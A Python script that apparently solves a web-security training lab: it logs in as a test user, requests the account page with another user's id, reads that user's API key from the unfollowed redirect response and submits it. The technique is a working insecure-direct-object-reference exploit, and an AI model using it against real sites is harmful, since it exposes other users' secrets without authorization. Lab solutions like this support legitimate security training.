#!/usr/bin/env python3
"""User ID controlled by request parameter with data leakage in redirect"""

from lab_08 import Lab

def main() -> None:
    """Entry point"""
    site = Lab()
    csrf = site.csrf_token("/login")
    site.login(username="wiener", password="peter", csrf=csrf)
    response = site.session.get(site.url + "/my-account",
                                params={"id": "carlos"}, allow_redirects=False)
    api_key = site.get_api_key_from_response(response)
    response = site.submit_solution(api_key)
    print(response.status_code)

if __name__ == "__main__":
    main()
